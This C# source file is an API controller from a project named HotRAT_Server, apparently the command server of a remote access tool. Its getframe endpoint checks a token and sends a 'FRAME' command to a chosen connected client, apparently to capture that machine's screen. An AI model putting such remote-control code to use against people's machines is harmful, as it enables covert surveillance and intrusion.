using HotRAT_Server.Controllers;
using HotRAT_Server.Models;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;

namespace HotRAT_Server.ApiServer.Controllers
{
    [Route("api/control")]
    [ApiController]
    public class ControlController : ControllerBase
    {
        private readonly ILogger<ControlController> _logger;

        public ControlController(ILogger<ControlController> logger)
        {
            _logger = logger;
        }

        [HttpPost("getframe")]
        public async Task<IActionResult> GetFrame([FromForm] string token, [FromForm] string id, [FromForm] string tick = "")
        {
            if (string.IsNullOrEmpty(token) || token != AuthModel.Token())
            {
                return Ok(new { code = 203, data = false });
            }
            else
            {
                var result = await Program.server.SendMessage(id,"FRAME");
                return Ok(new { code = 200, data = result });
            }
        }
    }
}
